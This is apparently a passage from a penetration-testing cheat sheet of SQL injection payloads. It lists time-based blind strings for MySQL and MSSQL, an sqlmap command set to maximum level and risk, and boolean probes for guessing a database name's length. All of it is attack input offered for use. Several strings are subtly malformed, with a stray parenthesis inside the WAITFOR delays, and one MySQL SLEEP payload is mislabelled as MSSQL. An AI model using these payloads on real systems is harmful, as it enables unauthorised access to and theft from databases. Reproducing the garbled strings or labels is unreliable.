### Time-based

```bash
test' and sleep(10)-- - (Most databases)
test;waitfor delay '0:0:10)'-- -  (MSSQL)
1');WAITFOR DELAY '0:0:10)'-- -  (MSSQL)
test';WAITFOR DELAY '0:0:10)'-- -  (MSSQL)
1;WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
';WAITFOR DELAY '0:0:5'-- (MSSQL)


=1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND (1 - (MSSQL)

' OR SLEEP(5) -- - (MYSQL)
sqlmap -r search.txt --batch --dbs --technique=T --dbms=MySQL --level=3 --risk=3
```

### Boolean

Determine character length of database name:

```bash
1' and length(database())=1#
1' and length(database())=2#
1' and length(database())=3#
```